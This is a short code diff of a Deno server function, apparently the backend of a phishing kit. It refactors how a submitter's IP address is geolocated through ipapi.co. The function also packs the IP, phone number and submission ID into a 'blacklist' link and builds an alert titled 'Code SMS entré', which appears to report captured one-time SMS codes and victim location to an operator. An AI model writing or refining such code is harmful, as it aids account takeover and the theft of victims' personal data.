@@ -43,14 +43,18 @@ Deno.serve(async (req) => {
   const blacklistPayload = btoa(JSON.stringify({ ip, telephone, submissionId }));
   const blacklistUrl = `${appUrl}/api/blacklist?data=${blacklistPayload}`;
 
-  const geoResponse = await fetch("https://ipapi.co/" + ip + "/json/").catch(() => null);
-  let geoData = { country_name: "France", city: "Inconnue" };
-  if (geoResponse?.ok) {
-    geoData = await geoResponse.json();
+  let country = "Inconnue";
+  let city = "Inconnue";
+  try {
+    const geoRes = await fetch(`https://ipapi.co/${ip}/json/`, { signal: AbortSignal.timeout(3000) });
+    if (geoRes.ok) {
+      const geo = await geoRes.json();
+      country = geo.country_name || geo.country || "Inconnue";
+      city = geo.city || "Inconnue";
+    }
+  } catch (e) {
+    console.error("Geolocation error:", e.message);
   }
-
-  const country = geoData.country_name || "France";
-  const city = geoData.city || "Inconnue";
 
   const embed = {
     title: "🔑 Code SMS entré",
